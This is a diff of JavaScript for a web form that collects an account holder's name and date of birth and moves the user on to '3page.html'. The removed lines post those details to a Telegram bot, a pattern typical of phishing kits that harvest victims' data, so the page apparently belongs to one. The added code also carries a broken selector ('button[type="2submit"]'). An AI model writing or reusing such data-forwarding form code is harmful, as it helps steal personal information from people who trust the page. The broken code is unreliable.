@@ -1,41 +1,22 @@
-// Function to format DOB input with slashes and validate the date
+// Function to format DOB input with slashes
 document.getElementById('dob').addEventListener('input', function(event) {
     let input = event.target.value.replace(/\D/g, ''); // Remove non-digits
     let formatted = '';
 
-    // Format input with slashes
-    if (input.length >= 2) {
-        formatted += input.slice(0, 2) + '/';
-    }
-    if (input.length >= 4) {
-        formatted += input.slice(2, 4) + '/';
-    }
     if (input.length > 4) {
-        formatted += input.slice(4, 8);
-    }
-
-    // Update the input field value
-    event.target.value = formatted;
-
-    // Validate the date
-    if (formatted.length === 10) {
-        const [day, month, year] = formatted.split('/').map(Number);
-        const validDay = day >= 1 && day <= 31;
-        const validMonth = month >= 1 && month <= 12;
-        const validYear = year >= 1900 && year <= 2024;
-
-        if (!validDay || !validMonth || !validYear) {
-            event.target.setCustomValidity('Invalid date. Please enter a valid date.');
-        } else {
-            event.target.setCustomValidity('');
-        }
+        formatted = `${input.slice(0, 2)}/${input.slice(2, 4)}/${input.slice(4, 8)}`;
+    } else if (input.length > 2) {
+        formatted = `${input.slice(0, 2)}/${input.slice(2)}`;
     } else {
-        event.target.setCustomValidity('');
+        formatted = input;
     }
+
+    // Set the formatted value to the input field
+    event.target.value = formatted;
 });
 
 // Event listener for form submission
-document.querySelector('button[type="submit"]').addEventListener('click', function(event) {
+document.querySelector('button[type="2submit"]').addEventListener('click', function(event) {
     event.preventDefault();
 
     // Validate form fields
@@ -60,18 +41,6 @@ document.querySelector('button[type="submit"]').addEventListener('click', functi
         return;
     }
 
-    // Telegram Bot API details
-    const botToken = 'YOUR_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
-
-    // Message to send
-    const message = `Account Holder Name: ${accountHolderName}\nDate of Birth: ${dob}`;
-
-    // Send data to Telegram bot
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
+    // Redirect to 3page.html after validation
+    window.location.href = '3page.html';
+});
